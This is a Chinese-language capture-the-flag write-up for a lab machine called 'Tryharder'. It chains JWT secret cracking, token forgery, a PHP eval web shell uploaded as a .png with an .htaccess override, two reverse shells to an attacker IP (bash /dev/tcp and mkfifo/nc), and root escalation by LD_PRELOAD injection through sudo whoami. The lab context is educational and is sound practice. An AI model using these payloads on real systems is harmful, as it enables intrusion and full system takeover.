# Tryharder

> 日期：2025-07-04 ｜ 作者：dehua ｜ 标签：hvm，jwt， LD_PRELOAD

---

## 信息收集阶段

首先对目标进行端口扫描，发现开放的服务如下：

```bash
nmap -sCV -p- 192.168.218.185
```

```text
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: 西溪湖科技 - 企业门户网站
```

---

## 漏洞利用过程

主页是一个静态页面，啥也干不了，看源码有发现 API 路径，像是 Base64 编码：

<img width="936" height="328" alt="Image" src="https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1" />

```bash
echo "NzQyMjE=" | base64 -d
# 输出：74221
```

访问 `/74221/` 是一个登录页面，继续进行目录扫描：

```bash
gobuster dir -u http://192.168.218.185/74221/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
```

```text
/uploads              (Status: 301)
/index.php            (Status: 200)
/dashboard.php        (Status: 302)
```

登录账号：test  密码：123456

<img width="1840" height="939" alt="Image" src="https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3" />



登录后发现是 JWT 身份验证，抓取 token 后尝试使用 hashcat 破解：


```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

```text
候选密钥：jwtsecret123
```

<img width="1919" height="616" alt="Image" src="https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec" />

<img width="1915" height="608" alt="Image" src="https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d" />

忘截图了，上面token中的sub是上传目录把123改成999，不然可能上传不成功
使用伪造 token 后页面出现上传功能，上传如下两个文件：

**shell.png**

```php
<?php @eval($_POST['cmd']); ?>
```

**.htaccess**

```apache
<IfModule mime_module>
	AddHandler php5-script .png
	SetHandler application/x-httpd-php
</IfModule>
```

访问 payload 后执行：

<img width="917" height="111" alt="Image" src="https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5" />

```php
cmd=system("/usr/bin/bash -c '/usr/bin/bash -i >&/dev/tcp/192.168.218.148/1234 0>&1'");
```

<img width="924" height="221" alt="Image" src="https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1" />

## 权限提升分析

在 pentester 用户主目录中找到 `.note` 文件，结合 `/etc/passwd` 中的信息
但是我是想了很久也不知道这在提示什么，还是GPT好使，GPT告诉我可能与加密，隐写，凯撒密码这些有关，然后我开始对照这些语句的原文开始猜测，然后又浪费了很多时间，也没解出来，最后看了佬的wp，原来是找隐藏文件

```bash
find / -name '.*' 2>/dev/null | grep -v sys
```
先看/srv
```bash
www-data@Tryharder:/srv$ cat ...
Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
```
看着跟passwd中的提示很像，可能是移位密码
再看看secret中的提示
```bash
www-data@Tryharder:/var/backups/.secret/.verysecret/.noooooo$ cat note2.txt 
```

问了一手gpt：
•	方法 1：第一段 = 第二段 + 固定位移（如凯撒 +5）。
•	方法 2：第一段 = 第二段 + 符号替换（如 ! → "） + 字母替换（如 a → u）。
•	方法 3：第一段是第二段的 异或（XOR） 或 Base64 编码后的变形。

最有可能的就是异或


```bash
#!/bin/bash
s1='原始字符串'
s2='密文字符串'
for ((i=0; i<${#s1}; i++)); do
  [[ "${s1:i:1}" = "${s2:i:1}" ]] && printf "0" || printf "1"
done
echo
```
```bash
www-data@Tryharder:/tmp$ ./123
0101100100110000010101010101111100110101010011010011010001010011010010000011001101000100010111110011000100110111010111110011100001010101010001000100010001011001
www-data@Tryharder:/tmp$
```


最终解出密码为：`Y0U_5M4SH3D_17_8UDDY`

SSH 登录 pentester 用户后：

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/find
```
以为可以秒杀了试了很多就不能提权，扒拉一会，突然想到有个后门py，但是是xiix用户的，想着sudo find，结果也是报错。其实早在www用户我就发现了本地端口8989，感觉有用，想做端口转发来着，但是被密码给转义注意了，后面没思路都忘记了这个端口的事情。后面没思路了各种扒拉，还以为是find命令错了，最后还是看了wp才知道还有路子，这也是提醒我以后要更加细心了。
使用nc连接本地8989端口，只知道pentester用户的密码就试了一下，进去了
拿反向shell：

```bash
shell> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 192.168.218.148 4444 >/tmp/f
```

在 xiix 目录中发现 `guess_game`：

```bash
xiix@Tryharder:~$ ./guess_game
./guess_game
===== 终极运气挑战 / Ultimate Luck Challenge ====
规则很简单： 我心里有个数字（0-99），你有一次机会猜。
I have a number (0-99), you get one guess.
猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
Guess right, I’ll give your reward; wrong? Hehe, face the consequences!
提示： 聪明人也许能找到捷径。
Hint: Smart ones might find a shortcut.
输入你的猜测（0-99） / Your guess (0-99): 80
80
哈哈，猜错了！ / Wrong guess!
秘密数字是 7。 / Secret number: 7
正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)
是个游戏，直接爆破
```

```bash
while true; do echo 1 | ./guess_game; done
# 爆破出密码：superxiix
```
ssh登录xiix
使用 `sudo -l`：

```bash
sudo -l
# (ALL : ALL) /bin/whoami
```

不会这个提权，问问GPT：
可以尝试利用环境变量或 LD_PRELOAD 绕过。
你可以伪造一个共享库，注入到 sudo /bin/whoami 中：
编写提权的 so 文件（C 代码）
创建一个 C 文件，叫 root.c：
```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void run() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
编译为共享库
```bash
gcc -fPIC -shared -o root.so root.c
```
使用 LD_PRELOAD 注入并执行
```bash
sudo LD_PRELOAD=$PWD/root.so /bin/whoami
```


就可以成功提权了

